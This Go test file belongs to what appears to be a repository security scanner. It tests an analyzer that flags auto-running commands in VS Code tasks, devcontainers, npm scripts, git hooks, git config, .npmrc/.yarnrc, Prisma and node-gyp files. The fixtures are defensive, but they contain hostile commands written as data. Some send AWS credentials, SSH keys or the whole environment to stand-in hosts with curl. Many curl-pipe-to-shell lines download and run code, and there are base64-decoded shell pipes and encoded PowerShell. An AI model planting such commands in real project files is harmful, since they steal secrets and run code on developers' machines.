package autoexec_test

import (
	"context"
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static/autoexec"
	"github.com/mrdhira/galahad/internal/protocol"
)

const (
	tasksFolderOpen = `// tasks
{
  "tasks": [ /* one */
    {
      "label": "init",
      "type": "shell",
      "command": "curl -s -d @$HOME/.aws/credentials https://collect.sinkhole.test/x",
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}
`
	tasksNoRunOn = `{
  "tasks": [
    {
      "label": "start",
      "command": "curl https://a.test/x.sh | sh"
    }
  ]
}
`
)

// findings runs the analyzer and returns "RULE:line" for the primary evidence of each finding, sorted.
func findings(t *testing.T, path, data string) ([]string, analyze.Output) {
	t.Helper()
	f := analyze.File{Path: path, Name: path[strings.LastIndex(path, "/")+1:], Data: []byte(data)}
	out, err := autoexec.New().Analyze(context.Background(), f)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, fi := range out.Findings {
		got = append(got, fmt.Sprintf("%s:%d", strings.TrimPrefix(fi.RuleID, "GAL-AUTOEXEC-"), fi.Evidence[0].Line))
	}
	slices.Sort(got)
	return got, out
}

// fanOut returns a tasks file with n folder-open tasks that all depend on one
// task that downloads and runs code. Everything is on line 2.
func fanOut(n int) string {
	var b strings.Builder
	b.WriteString("{\"tasks\":[\n")
	b.WriteString("{\"label\":\"dep\",\"command\":\"curl https://a.test/x | sh\"}")
	for i := range n {
		fmt.Fprintf(&b, ",{\"label\":\"t%d\",\"command\":\"echo\",\"dependsOn\":\"dep\",\"runOptions\":{\"runOn\":\"folderOpen\"}}", i)
	}
	b.WriteString("]}")
	return b.String()
}

func TestAnalyze(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: "<rule suffix>:<line>" of the primary evidence
		want []string
	}{
		{name: "task on folder open with secret exfiltration in JSONC", path: ".vscode/tasks.json", data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
		{name: "task inside a container member", path: "repo.zip!/.vscode/tasks.json", data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
		{name: "script committed under .venv/bin is graded without inventory", path: ".venv/bin/pip", data: "#!/bin/sh\ncurl https://a.test/x | sh\n", want: []string{"011:2"}},
		{name: "script committed under a nested venv/Scripts is graded", path: "sub/venv/Scripts/activate.bat", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
		{name: "script committed under node_modules/.bin is graded", path: "node_modules/.bin/tool", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
		{name: "benign script under node_modules/.bin", path: "node_modules/.bin/tool", data: "#!/bin/sh\nexec node ../tool/cli.js \"$@\"\n"},
		{name: "task without runOn is not automatic", path: ".vscode/tasks.json", data: tasksNoRunOn},
		{name: "task with platform command and args", path: ".vscode/tasks.json", data: `{"tasks":[{
  "runOptions":{"runOn":"folderOpen"},
  "windows":{"command":"powershell","args":["-nop","-enc","SQBFAFgAIAAoAE4AZQB3AC0ATwBi"]}
}]}`, want: []string{"001:3", "012:3"}},
		{name: "task without command points at the task", path: ".vscode/tasks.json", data: `{"tasks":[
 {"runOptions":{"runOn":"folderOpen"}}]}`, want: []string{"001:2"}},
		{name: "runOn is compared ignoring case", path: ".vscode/tasks.json", data: `{"tasks":[{"command":"curl https://a.test/x | sh","runOptions":{"runOn":"FolderOpen"}}]}`, want: []string{"001:1", "011:1"}},
		{name: "runOn that is not a string is ignored", path: ".vscode/tasks.json", data: `{"tasks":[{"command":"curl https://a.test/x | sh","runOptions":{"runOn":["folderOpen"]}}]}`},
		{name: "duplicate keys: the last command wins", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"echo hi\",\n\"command\":\"curl https://a.test/x | sh\",\n\"runOptions\":{\"runOn\":\"default\",\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:3"}},
		{name: "byte order mark and comments before the root", path: ".vscode/tasks.json", data: "\xef\xbb\xbf// c\n{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:3"}},
		{name: "task options shell args are graded", path: ".vscode/tasks.json", data: `{"tasks":[{
"command":"bash",
"options":{"shell":{"executable":"bash","args":["-c","curl https://a.test/x | sh"]}},
"runOptions":{"runOn":"folderOpen"}}]}`, want: []string{"001:2", "011:2"}},
		{name: "dependsOn tasks are graded, cycles end", path: ".vscode/tasks.json", data: `{"tasks":[
{"label":"a","command":"echo a","dependsOn":["b","a"],"runOptions":{"runOn":"folderOpen"}},
{"label":"b","command":"curl https://a.test/x | sh","dependsOn":"a"}]}`, want: []string{"001:2", "011:3"}},
		{name: "dependsOn task identifier objects are graded", path: ".vscode/tasks.json", data: `{"tasks":[
{"label":"a","command":"echo","dependsOn":[{"type":"shell","task":"b"}],"runOptions":{"runOn":"folderOpen"}},
{"label":"b","type":"shell","command":"curl https://a.test/x | sh"}]}`, want: []string{"001:2", "011:3"}},
		{name: "dependsOn as a single task identifier", path: ".vscode/tasks.json", data: `{"tasks":[
{"label":"a","command":"echo","dependsOn":{"type":"shell","task":"b"},"runOptions":{"runOn":"folderOpen"}},
{"label":"b","command":"curl https://a.test/x | sh"}]}`, want: []string{"001:2", "011:3"}},
		{name: "a task many tasks depend on is graded once, findings per rule are capped", path: ".vscode/tasks.json", data: fanOut(2000), want: append(slices.Repeat([]string{"001:2"}, protocol.MaxFindingsPerRulePerFile), "011:2")},
		{name: "tasks in a code-workspace file", path: "x.code-workspace", data: `{"folders":[],"tasks":{"tasks":[
{"command":"curl https://a.test/x | sh","runOptions":{"runOn":"folderOpen"}}]}}`, want: []string{"001:2", "011:2"}},
		{name: "settings tool path into the repo", path: ".vscode/settings.json", data: `{
  // tools
  "eslint.nodePath": "./tools/node",
  "python.defaultInterpreterPath": "${workspaceFolder}/tools/python",
  "php.validate.executablePath": "/usr/bin/php",
  "python.pythonPath": ".venv/bin/python",
  "editor.fontSize": 12
}`, want: []string{"002:3", "002:4"}},
		{name: "settings paths into a virtualenv or node_modules are not reported", path: ".vscode/settings.json", data: `{
  "python.defaultInterpreterPath": "${workspaceFolder}/.venv/bin/python",
  "python.pythonPath": "${workspaceFolder}\\venv\\Scripts\\python.exe",
  "eslint.nodePath": "${workspaceFolder}/node_modules/.bin/node",
  "php.validate.executablePath": "${workspaceFolder}/.venv/../tools/php"
}`, want: []string{"002:5"}},
		{name: "settings terminal shell args with a command", path: ".vscode/settings.json", data: `{
  "terminal.integrated.profiles.linux": {"x": {"path": "bash", "args": ["-c", "id"]}},
  "terminal.integrated.shellArgs.windows": ["-NoLogo"]
}`, want: []string{"002:2"}},
		{name: "devcontainer initializeCommand downloads and runs", path: ".devcontainer/devcontainer.json", data: `{
  "name": "x",
  "initializeCommand": "curl -fsSL https://a.test/i.sh | sh"
}`, want: []string{"003:3", "011:3"}},
		{name: "devcontainer lifecycle commands as string array and object", path: ".devcontainer.json", data: `{
  "postCreateCommand": ["npm", "install"],
  "postStartCommand": {
    "a": "echo hi",
    "b": "echo aGk= | base64 -d | sh"
  }
}`, want: []string{"004:2", "004:3", "012:5"}},
		{name: "npm install scripts and prepare", path: "package.json", data: `{
  "scripts": {
    "preinstall": "node a.js",
    "postinstall": "curl -fsSL https://a.test/i.sh | sh",
    "prepare": "husky",
    "start": "node index.js"
  }
}`, want: []string{"005:3", "005:4", "006:5", "011:4"}},
		{name: "npm preprepare and postprepare", path: "package.json", data: `{"scripts":{
"preprepare":"node a.js",
"postprepare":"echo aGk= | base64 -d | sh"}}`, want: []string{"006:2", "006:3", "012:3"}},
		{name: "husky 4 hooks in package.json", path: "package.json", data: `{"husky":{"hooks":{
"pre-commit":"curl https://a.test/x | sh","commit-msg":"echo ok"}}}`, want: []string{"006:2", "006:2", "011:2"}},
		{name: "npm package under node_modules is ignored", path: "node_modules/x/package.json", data: `{"scripts":{"postinstall":"node a.js"}}`},
		{name: "husky hook runs a download", path: ".husky/pre-commit", data: "#!/usr/bin/env sh\ncurl -fsSL https://a.test/h.sh | sh\n", want: []string{"006:2", "011:2"}},
		{name: "husky hook with a comment and a continued secret send", path: ".husky/pre-push", data: ". \"$(dirname -- \"$0\")/_/husky.sh\"\n# curl -d $API_TOKEN\ncat ~/.ssh/id_rsa | \\\n  curl -d @- https://a.test\n", want: []string{"006:3", "010:3"}},
		{name: "husky lint hook", path: ".husky/pre-commit", data: "npx lint-staged\n", want: []string{"006:1"}},
		{name: "husky bulk env dump sent away", path: ".husky/pre-push", data: "env | curl -d @- https://a.test\n", want: []string{"006:1", "010:1"}},
		{name: "husky helper husky.sh is ignored", path: ".husky/_/husky.sh", data: "curl x | sh\n"},
		{name: "husky generated files are graded without inventory", path: ".husky/_/h", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
		{name: "pre-commit local hooks with entry and block entry", path: ".pre-commit-config.yaml", data: `repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: end-of-file-fixer
  - repo: local
    hooks:
      - id: a
        entry: ./scripts/check.sh
      - id: b
        entry: |
          curl -s https://a.test/x | sh
  - repo: https://github.com/x/y
    hooks:
      - id: c
`, want: []string{"006:11", "006:9", "011:11"}},
		{name: "pre-commit local without entry", path: ".pre-commit-config.yaml", data: "repos:\n  - repo: local\n    hooks: []\n", want: []string{"006:2"}},
		{name: "pre-commit remote hooks only", path: ".pre-commit-config.yaml", data: "repos:\n  - repo: https://github.com/x/y\n    hooks:\n      - id: c\n"},
		{name: "git config fsmonitor hooksPath sshCommand and smudge", path: ".git/config", data: `[core]
	repositoryformatversion = 0
	fsmonitor = curl -s https://a.test/m | sh
	hooksPath = .githooks
	sshCommand = ssh -i key
[filter "x"]
	smudge = cat
	clean = git-lfs clean -- %f
[core "y"]
`, want: []string{"009:3", "009:4", "009:5", "009:7", "011:3"}},
		{name: "git config key on the section header line", path: ".git/config", data: "[core] fsmonitor = curl https://a.test/x | sh\n", want: []string{"009:1", "011:1"}},
		{name: "git lfs filter chained with a download is still reported", path: ".git/config", data: "[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f && curl https://a.test/x | sh\n\tprocess = git-lfs filter-process\n\tclean = git-lfs-evil clean\n", want: []string{"009:2", "009:4", "011:2"}},
		{name: "git config values are graded even for a known tool", path: ".git/config", data: "[core]\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"x\"]\n\tprocess = git lfs filter-process\n"},
		{name: "git config benign values", path: ".git/config", data: "[core]\n\tfsmonitor = true\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[user]\n\tname = x\n"},
		{name: ".npmrc defaults and unrelated keys", path: ".npmrc", data: "save-exact=true\nengine-strict=true\nfund=false\nignore-scripts=false\nregistry=https://registry.npmjs.org/ ; the default\n"},
		{name: ".npmrc registry and scoped registry on another host", path: "app/.npmrc", data: "# registries\nregistry=https://npm.sinkhole.test/\n@acme:registry=\"https://npm.acme.test/\"\n//npm.acme.test/:_authToken=${NPM_TOKEN}\nregistry=\n", want: []string{"013:2", "013:3"}},
		{name: ".npmrc node-options script-shell and git run commands", path: ".npmrc", data: "node-options=--require ./hook.js\nscript-shell=curl https://a.test/x | sh\ngit=./bin/git\nnode-options=\n", want: []string{"011:2", "013:1", "013:2", "013:3"}},
		{name: ".npmrc value ends at the first unescaped ; or #", path: ".npmrc", data: "registry=https://npm.sinkhole.test;@registry.npmjs.org/\nregistry=https://registry.npmjs.org/\\;x\nregistry=https://npm.sinkhole.test#frag\n", want: []string{"013:1", "013:3"}},
		{name: ".npmrc quoted and JSON-escaped keys and values", path: ".npmrc", data: "\"registry\"=\"https://npm.sinkhole.test/\"\n'node-options'='--require ./x.js'\n\"reg\\u0069stry\"=https://npm.sinkhole.test/\nregistry=\"https://registry.npmjs.org/\"\n", want: []string{"013:1", "013:2", "013:3"}},
		{name: ".npmrc node-gyp, pnpmfile and global-pnpmfile", path: ".npmrc", data: "node-gyp=./bin/gyp.js\npnpmfile=./.pnpmfile.cjs\nglobal-pnpmfile=./g.cjs\nnode-gyp=curl https://a.test/x | sh\npnpmfile=\n", want: []string{"011:4", "013:1", "013:2", "013:3", "013:4"}},
		{name: ".npmrc section header is skipped and the keys after it are read", path: ".npmrc", data: "[section]\nregistry=https://npm.sinkhole.test/\n", want: []string{"013:2"}},
		{name: ".npmrc userconfig and globalconfig", path: ".npmrc", data: "userconfig=./.npmrc-user\nglobalconfig = ./g\nuserconfig=\n", want: []string{"013:1", "013:2"}},
		{name: ".npmrc prefix and cache inside the repo", path: ".npmrc", data: "prefix=.npm-global\ncache=./.cache\n", want: []string{"013:1", "013:2"}},
		{name: ".npmrc prefix and cache outside the repo", path: ".npmrc", data: "prefix=/usr/local\ncache=~/.npm\ncache=${HOME}/.npm\n; cache=.x\n"},
		{name: ".yarnrc committed release and a registry on another host", path: ".yarnrc", data: "yarn-path \".yarn/releases/yarn-1.22.19.js\"\nregistry \"https://npm.sinkhole.test\"\n", want: []string{"013:2", "014:1"}},
		{name: ".yarnrc colon as the separator", path: ".yarnrc", data: "yarn-path: ./x.js\nyarn-path:\"./y.js\"\n", want: []string{"013:1", "013:2"}},
		{name: ".yarnrc scoped registry with a quoted key", path: ".yarnrc", data: "\"@acme:registry\" \"https://npm.sinkhole.test\"\n\"@acme:registry\" \"https://registry.yarnpkg.com\"\n\"unterminated yarn-path ./x.js\n", want: []string{"013:1"}},
		{name: ".yarnrc yarn-path outside .yarn/releases", path: ".yarnrc", data: "# yarn\nyarn-path \"./scripts/yarn.js\"\n", want: []string{"013:2"}},
		{name: ".yarnrc defaults and unrelated keys", path: ".yarnrc", data: "--install.ignore-scripts true\nregistry \"https://registry.yarnpkg.com\"\nlonely\n"},
		{name: ".yarnrc.yml standard Yarn Berry setup", path: ".yarnrc.yml", data: "nodeLinker: node-modules\nyarnPath: .yarn/releases/yarn-4.5.0.cjs\n", want: []string{"014:2"}},
		{name: ".yarnrc.yml yarnPath outside .yarn/releases", path: ".yarnrc.yml", data: "yarnPath: tools/yarn.cjs\n", want: []string{"013:1"}},
		{name: ".yarnrc.yml yarnPath that leaves the releases folder", path: ".yarnrc.yml", data: "yarnPath: \".yarn/releases/../../evil.cjs\"\n", want: []string{"013:1"}},
		{name: ".yarnrc.yml yarnPath in the releases folder but not named like a release", path: ".yarnrc.yml", data: "yarnPath: .yarn/releases/evil.cjs\n", want: []string{"013:1"}},
		{name: ".yarnrc.yml quoted keys", path: ".yarnrc.yml", data: "\"yarnPath\": tools/yarn.cjs\n'npmRegistryServer': \"https://npm.sinkhole.test\"\n", want: []string{"013:1", "013:2"}},
		{name: ".yarnrc.yml scalar on the next, more indented line", path: ".yarnrc.yml", data: "yarnPath:\n  tools/yarn.cjs\nnpmRegistryServer: >-\n  https://npm.sinkhole.test\nplugins:\n  - path:\n      ./plugins/mine.cjs\n", want: []string{"013:1", "013:3", "013:6"}},
		{name: ".yarnrc.yml empty values with no scalar after them", path: ".yarnrc.yml", data: "yarnPath:\nnodeLinker: pnp\nnpmRegistryServer:\n\n  # none\n", want: nil},
		{name: ".yarnrc.yml scalar after blank and comment lines", path: ".yarnrc.yml", data: "npmRegistryServer:\n\n  # registry\n  https://npm.sinkhole.test\n", want: []string{"013:1"}},
		{name: ".yarnrc.yml keys inside a flow mapping or nested are reported", path: ".yarnrc.yml", data: "x: {yarnPath: ./evil.cjs}\ny: {\"npmRegistryServer\": \"https://npm.sinkhole.test\"}\nsettings:\n  plugins: [a]\n", want: []string{"013:1", "013:2", "013:4"}},
		{name: ".yarnrc.yml plugins as a flow mapping", path: ".yarnrc.yml", data: "plugins: {a: b}\n", want: []string{"013:1"}},
		{name: ".yarnrc.yml registries and plugins", path: ".yarnrc.yml", data: "npmRegistryServer: \"https://registry.yarnpkg.com\"\nnpmScopes:\n  acme:\n    npmRegistryServer: \"https://npm.acme.test\"\nplugins:\n  - path: .yarn/plugins/@yarnpkg/plugin-workspace-tools.cjs\n    spec: \"@yarnpkg/plugin-workspace-tools\"\n  - path: ./plugins/mine.cjs\n  - ./plugins/bare.cjs\nenableTelemetry: false\nunrelated:\n  path: tools/x.cjs\n", want: []string{"013:4", "013:8", "013:9", "014:6"}},
		{name: ".yarnrc.yml plugins as a flow list", path: ".yarnrc.yml", data: "plugins: [./a.cjs]\n# plugins: [./b.cjs]\n", want: []string{"013:1"}},
		{name: ".yarnrc.yml empty plugins list is fine, a nested yarnPath is reported", path: ".yarnrc.yml", data: "plugins: []\nsettings:\n  yarnPath: a.js\n", want: []string{"013:3"}},
		{name: ".pnpmfile.cjs runs on install", path: ".pnpmfile.cjs", data: "module.exports = { hooks: { readPackage(pkg) { return pkg } } }\n", want: []string{"015:1"}},
		{name: ".pnpmfile.cjs command is graded", path: "web/.pnpmfile.cjs", data: "const { execSync } = require('child_process')\nexecSync('curl https://a.test/x | sh')\n", want: []string{"011:2", "015:1"}},
		{name: ".pnpmfile.mjs runs on install", path: ".pnpmfile.mjs", data: "export const hooks = {}\n", want: []string{"015:1"}},
		{name: "Prisma schema with package providers", path: "prisma/schema.prisma", data: "generator client {\n  provider = \"prisma-client-js\"\n}\ngenerator zod { provider = \"@acme/Zod-Gen\" }\ndatasource db {\n  provider = \"postgresql\"\n  url = env(\"DATABASE_URL\")\n}\n"},
		{name: "Prisma provider that runs an installed package", path: "schema.prisma", data: "generator a {\n  provider = \"node node_modules/prisma-erd-generator\"\n}\ngenerator b {\n  provider = \"node node_modules/@acme/gen/\"\n}\ngenerator c {\n  provider = \"node node_modules/../x.js\"\n}\ngenerator d {\n  provider = \"node node_modules/gen && curl https://a.test/x | sh\"\n}\n", want: []string{"011:11", "016:11", "016:8"}},
		{name: "Prisma generator providers that are commands", path: "schema.prisma", data: "generator a {\n  provider = \"node ./gen.js\"\n}\ngenerator b {\n  provider = \"./gen.sh\"\n}\ngenerator c {\n  provider = \"prisma-client-js && curl https://a.test/x | sh\"\n}\ngenerator d { provider = env(\"GEN\") }\n// generator e { provider = \"sh x\" }\ngenerator f {\n  output = \"x }\"\n  provider = \"x y\"\n}\ngenerator g {\n  output = \"x\"\n}\n", want: []string{"011:8", "016:10", "016:14", "016:2", "016:5", "016:8"}},
		{name: "node-gyp file without expansions", path: "binding.gyp", data: "{\n  'targets': [{ 'target_name': 'addon', 'sources': ['addon.cc'] }]\n}\n"},
		{name: "node-gyp expansions of node-addon-api, nan and pkg-config are not reported", path: "binding.gyp", data: `{ 'targets': [{
  'include_dirs': ["<!@(node -p \"require('node-addon-api').include\")"],
  'dependencies': ["<!(node -p \"require('node-addon-api').targets\"):node_addon_api"],
  'a': ["<!(node -e \"require('nan')\")"],
  'b': ["<!@(pkg-config cairo --cflags-only-I | sed s/-I//g)"],
  'c': ["<!@( node -p \"require('node-addon-api').include_dir\" )"],
}]}
`},
		{name: "node-gyp known expansion chained with a download", path: "binding.gyp", data: `{ 'targets': [{
  'x': ["<!(node -p \"require('node-addon-api').include\" && curl https://a.test/x | sh)"],
}]}
`, want: []string{"011:2", "017:2"}},
		{name: "node-gyp pymod_do_main is never a known expansion", path: "binding.gyp", data: "{'x': '<!pymod_do_main(pkg-config cairo)'}\n", want: []string{"017:1"}},
		{name: "node-gyp later phase expansions", path: "binding.gyp", data: "{'a': '>!(curl https://a.test/x | sh)',\n'b': '^!(pkg-config cairo)'}\n", want: []string{"011:1", "017:1", "017:2"}},
		{name: "node-gyp comment marker inside a triple-quoted string", path: "binding.gyp", data: "{'targets': [{\n  'x': '''\n  # <!(curl https://a.test/x | sh)\n  ''',\n  'y': 'ok'  # <!(curl https://a.test/y | sh)\n}]}\n", want: []string{"011:3", "017:3"}},
		{name: "node-gyp other expansions are graded, the node-addon-api include is not, and actions are listed", path: "binding.gyp", data: "{\n  'targets': [{\n    'include_dirs': [\"<!@(node -p \\\"require('node-addon-api').include\\\")\"],\n    'defines': ['<!(curl https://a.test/x | sh)'],\n    # 'x': '<!(echo hi)'\n    'actions': [{ 'action_name': 'gen' }]\n  }]\n}\n", want: []string{"011:4", "017:4", "018:6"}},
		{name: "node-gyp include file with pymod_do_main", path: "deps/common.gypi", data: "{'variables': {'x': '<!pymod_do_main(gen)'}}\n", want: []string{"017:1"}},
		{name: "setup.py", path: "setup.py", data: "import os\nfrom setuptools import setup\nsetup(name='x')\n", want: []string{"007:3"}},
		{name: "setup.py without a setup call", path: "setup.py", data: "print(1)\n", want: []string{"007:1"}},
		{name: "pyproject backend-path", path: "pyproject.toml", data: "[project]\nbackend-path = ['x']\n[build-system]\nrequires = []\nbackend-path = ['build']\nbuild-backend = 'b'\n", want: []string{"007:5"}},
		{name: ".envrc is inventoried and graded", path: ".envrc", data: "# direnv\nexport A=1\ncurl https://a.test/i.sh | bash\n", want: []string{"008:1", "011:3"}},
		{name: "Makefile installer is inventory only", path: "Makefile", data: "tools:\n\tcurl -sSfL https://a.test/i.sh | sh\n", want: []string{"008:1"}},
		{name: "build.rs is inventory only", path: "build.rs", data: "fn main() {}\n", want: []string{"008:1"}},
		{name: "CI workflow is inventory only", path: ".github/workflows/ci.yml", data: "run: curl https://a.test | sh\n", want: []string{"008:1"}},
		{name: "unrelated file", path: "src/main.go", data: "package main\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
			if len(out.Skips) != 0 {
				t.Errorf("skips = %v, want none", out.Skips)
			}
		})
	}
}

func TestAnalyzeSkips(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantReason string
	}{
		{name: "json that does not parse", path: ".vscode/tasks.json", data: `{"tasks": [`, wantReason: "parse_error"},
		{name: "json root is not an object", path: "package.json", data: `[1]`, wantReason: "parse_error"},
		{name: "json nested too deep", path: "package.json", data: strings.Repeat("[", 200) + strings.Repeat("]", 200), wantReason: "parse_error"},
		{name: "config larger than the limit", path: ".husky/pre-commit", data: strings.Repeat("#", analyze.MaxConfigSize+1), wantReason: "too_large"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if len(got) != 0 {
				t.Errorf("findings = %v, want none", got)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
			}
		})
	}
}

func TestAnalyzePaddedPnpmfile(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: the finding stays, the contents are skipped
		want       []string
		wantReason string
	}{
		{name: "pnpmfile larger than the limit is still reported", path: ".pnpmfile.cjs", data: strings.Repeat("/", analyze.MaxConfigSize+1), want: []string{"015:1"}, wantReason: "too_large"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
			}
		})
	}
}

func TestAnalyzeLexicalFallback(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: the findings, and a parse_error skip
		want []string
	}{
		{name: "tasks file with a missing comma", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"FOLDEROPEN\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "code-workspace with a syntax error", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\":\"folderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
		{name: "devcontainer with a syntax error", path: ".devcontainer/devcontainer.json", data: "{\n\"initializeCommand\":\"curl https://a.test/x | sh\"\n\"postCreateCommand\":\"echo hi\"}", want: []string{"003:2", "004:3", "011:2"}},
		{name: "folderOpen written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"\\u0066olderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "runOn key written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"run\\u004fn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "comment between runOn and its value", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\" /*x*/ : \"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "command written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"c\\u0075rl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "an escaped backslash before u is not a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"echo\"\n\"runOptions\":{\"runOn\":\"\\\\u0066olderOpen\"}}]}"},
		{name: "devcontainer key written with a unicode escape", path: ".devcontainer/devcontainer.json", data: "{\n\"initialize\\u0043ommand\":\"curl https://a.test/x | sh\"\n\"x\":1}", want: []string{"003:2", "011:2"}},
		{name: "devcontainer lifecycle key behind a comment", path: ".devcontainer/devcontainer.json", data: "{\n\"postCreateCommand\" /*x*/ : \"echo hi\"\n\"x\":1}", want: []string{"004:2"}},
		{name: "code-workspace with a comment and an escape", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\" /*x*/ : \"\\u0066olderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
		{name: "command graded even without a trigger in the broken file", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"label\":\"x\"}]}", want: []string{"011:2"}},
		{name: "devcontainer command graded even without a trigger in the broken file", path: "x/.devcontainer/devcontainer.json", data: "{\n\"x\":\"curl https://a.test/x | sh\"\n\"y\":1}", want: []string{"011:2"}},
		{name: "tasks file with a syntax error and no trigger", path: ".vscode/tasks.json", data: `{"tasks":[`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != "parse_error" {
				t.Errorf("skips = %v, want one parse_error", out.Skips)
			}
		})
	}
}

func TestAnalyzeCancelled(t *testing.T) {
	tests := []struct {
		name    string
		wantErr bool
	}{
		{name: "cancelled context stops the analyzer", wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			cancel()

			_, err := autoexec.New().Analyze(ctx, analyze.File{Path: "package.json", Name: "package.json"})

			if (err != nil) != tt.wantErr {
				t.Errorf("err = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// expiring is a context that reports itself done after its first Err call.
type expiring struct {
	context.Context
	calls int
}

func (c *expiring) Err() error {
	c.calls++
	if c.calls > 1 {
		return context.DeadlineExceeded
	}
	return nil
}

func TestAnalyzeTimeout(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantReason string
	}{
		{name: "context ends while grading tasks", path: ".vscode/tasks.json", data: fanOut(10), wantReason: "timeout"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: tt.path, Name: "tasks.json", Data: []byte(tt.data)}

			out, err := autoexec.New().Analyze(&expiring{Context: context.Background()}, f)

			if err != nil {
				t.Fatal(err)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
			}
		})
	}
}

func TestStripJSONC(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		in string
		// expectations
		want string
	}{
		{name: "line and block comments and trailing commas", in: "{ // c\n \"a\": [1, 2,], /* b\n */ \"b\": 3, }", want: "{     \n \"a\": [1, 2 ],     \n    \"b\": 3  }"},
		{name: "comment markers inside strings stay", in: `{"u": "http://a/*b*/", "e": "q\"//x"}`, want: `{"u": "http://a/*b*/", "e": "q\"//x"}`},
		{name: "comma before a value stays", in: `[1,2]`, want: `[1,2]`},
		{name: "unterminated block comment", in: "{} /* x", want: "{}     "},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := string(autoexec.StripJSONC([]byte(tt.in)))

			if got != tt.want {
				t.Errorf("StripJSONC(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestName(t *testing.T) {
	tests := []struct {
		name     string
		wantName string
	}{
		{name: "analyzer name", wantName: "autoexec"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := autoexec.New().Name(); got != tt.wantName {
				t.Errorf("Name = %q, want %q", got, tt.wantName)
			}
		})
	}
}
